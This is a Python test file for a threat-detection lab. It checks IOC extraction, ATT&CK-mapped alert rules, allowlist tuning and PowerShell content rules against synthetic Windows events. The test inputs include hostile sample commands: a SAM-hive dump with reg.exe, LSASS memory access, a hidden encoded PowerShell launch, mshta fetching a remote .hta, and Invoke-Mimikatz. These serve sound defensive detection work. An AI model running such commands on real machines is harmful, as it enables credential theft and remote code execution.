import pandas as pd
from sentinel_lab import gen, detect as D

def df_(seed=7): return D.normalise(pd.DataFrame(gen.generate(seed)))

def test_entropy_separates_random_from_words():
    assert D.entropy("intranet") < 2.6 < 3.0 < D.entropy("a8k2x9q1z7m4b3")

def test_extract_iocs():
    t = f"curl 203.0.113.9 evil.bad-lab.example {gen.BAD_HASH}"
    i = D.extract_iocs(t); assert i["ip"] == ["203.0.113.9"] and i["sha256"] == [gen.BAD_HASH] and "evil.bad-lab.example" in i["domain"]

def test_every_injected_scenario_is_detected():
    df = df_(); ev = D.evaluate(df, D.detect(df))
    assert ev["recall"] == 1.0, ev["per_scenario"]

def test_every_alert_maps_to_attack_and_has_mitigation():
    for a in D.detect(df_()): assert a["technique"] in D.ATTACK and a["mitigation"]

def test_allowlist_removes_known_noisy_hosts():
    df = df_(); noisy = {f["src_ip"] for f in D.evaluate(df, D.detect(df, allowlist={}))["false_positives"]}
    assert {"10.0.0.5", "10.0.0.9"} <= noisy                       # false positives exist without tuning
    assert not {a["src_ip"] for a in D.detect(df)} & {"10.0.0.5", "10.0.0.9"}

def test_benign_only_traffic_raises_no_rule_alerts():
    df = df_(); b = df[df.label == "benign"]
    assert not [a for a in D.detect(b, allowlist={}) if a["source"] == "rule"]

# ---- real-data pipeline: unit tests on hand-built Windows events (no dataset download needed) ----
from sentinel_lab import rules, real_eval, winlog

def _w(**kw):
    base = dict(host="H1", ts="2026-01-01", eid=1, chan="sysmon", image="", cmd="", parent="", parent_cmd="", src_img="", tgt_img="", granted="", tobj="", text="", ps="")
    return {**base, **kw}

def _df(*rows):
    d = pd.DataFrame(rows); d["ts"] = pd.to_datetime(d["ts"]); d["proc"] = ((d.chan == "sysmon") & (d.eid == 1)) | ((d.chan == "security") & (d.eid == 4688)); return d

def _fired(*rows): return {a["technique"] for a in rules.run_rules(_df(*rows))}

def test_lsass_access_and_credential_tooling():
    assert "T1003" in _fired(_w(eid=10, tgt_img=r"C:\Windows\System32\lsass.exe", src_img=r"C:\x\evil.exe", granted="0x1010"))
    assert "T1003" in _fired(_w(cmd=r'"C:\windows\system32\reg.exe" save HKLM\sam sam'))       # quoted exe path must still match

def test_trusted_lsass_access_is_ignored():
    assert "T1003" not in _fired(_w(eid=10, tgt_img=r"C:\Windows\System32\lsass.exe", src_img=r"C:\Windows\System32\csrss.exe", granted="0x1010"))

def test_other_technique_rules_fire():
    assert "T1053" in _fired(_w(cmd=r"schtasks /create /tn x /tr calc.exe"))
    assert "T1059" in _fired(_w(cmd="powershell -nop -w hidden -enc " + "A" * 30))
    assert "T1218" in _fired(_w(cmd="mshta.exe http://203.0.113.5/a.hta"))

def test_benign_process_activity_is_quiet():
    assert not _fired(_w(cmd=r"C:\Windows\explorer.exe"), _w(cmd="notepad.exe report.txt"), _w(eid=13, tobj=r"HKLM\Software\Vendor\Setting"))

def test_log_clear_event_is_not_alerted():          # EID 1102 is produced by dataset preparation, deliberately excluded
    assert "T1562" not in _fired(_w(chan="security", eid=1102))

def test_split_is_deterministic_and_covers_both_sides():
    ids = [f"SDWIN-{i}" for i in range(60)]
    s = [real_eval.split_of(i) for i in ids]
    assert s == [real_eval.split_of(i) for i in ids] and {"dev", "test"} == set(s)

# ---- v2: PowerShell content rules ----
from sentinel_lab import rules_v2

def _ps(text, eid=4103): return _df(_w(chan="powershell", eid=eid, ps=text))
def _fired2(df): return {a["technique"] for a in rules_v2.run_rules(df)}

def test_v2_powershell_tool_names_map_to_techniques():
    assert "T1003" in _fired2(_ps("CommandInvocation(Invoke-Mimikatz): ..."))
    assert "T1069" in _fired2(_ps("CommandInvocation(Find-LocalAdminAccess)"))
    assert "T1049" in _fired2(_ps("CommandInvocation(Get-NetSession)"))

def test_v2_benign_powershell_stays_quiet():
    assert not _fired2(_ps("CommandInvocation(Start-Sleep): Seconds=5"))
    assert not _fired2(_ps("Set-Alias -Name icim -Value Invoke-CimMethod"))        # built-in alias definition (dev noise source)
    assert not _fired2(_ps("function f { Invoke-Expression $x }"))                 # invoke-expression alone is too common

def test_v2_is_superset_of_v1_and_leaves_v1_untouched():
    assert {r[0] for r in rules.RULES} <= {r[0] for r in rules_v2.ALL} and rules.COVERED == rules_v2.COVERED
